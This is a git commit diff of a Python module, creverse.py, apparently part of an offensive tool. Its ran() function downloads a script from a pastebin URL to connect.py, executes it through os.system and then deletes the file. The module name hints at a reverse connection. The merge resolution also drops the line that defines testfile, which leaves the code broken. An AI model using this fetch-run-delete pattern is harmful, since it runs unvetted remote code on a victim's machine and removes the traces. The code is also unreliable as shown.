fa17b4f0728475919dc2ecaf160e745e760e9d74
ST4LK3RCR4ZY <a_netocosta30@hotmail.com>
2016-12-25 16:49:27 -0300

    Update creverse.py

--- modules/creverse.py
+++ modules/creverse.py
@@ -1,19 +1,10 @@
 import os
 import urllib
-<<<<<<< HEAD
-=======
 
 filz = "http://pastebin.com/raw/qNjByHqW"
->>>>>>> ee163332f77e16cf91eb2f701f59fcfaffecc6fa
 
 def ran():
         print "[ + ] Connection [ + ]"
-	testfile = urllib.URLopener()
-<<<<<<< HEAD
-	testfile.retrieve("http://pastebin.com/raw/0dbGx4eq", "connect.py")
-	os.system("python connect.py")
-=======
 	testfile.retrieve(filz, "connect.py")
 	os.system("python connect.py")
 	os.remove("connect.py")
->>>>>>> ee163332f77e16cf91eb2f701f59fcfaffecc6fa
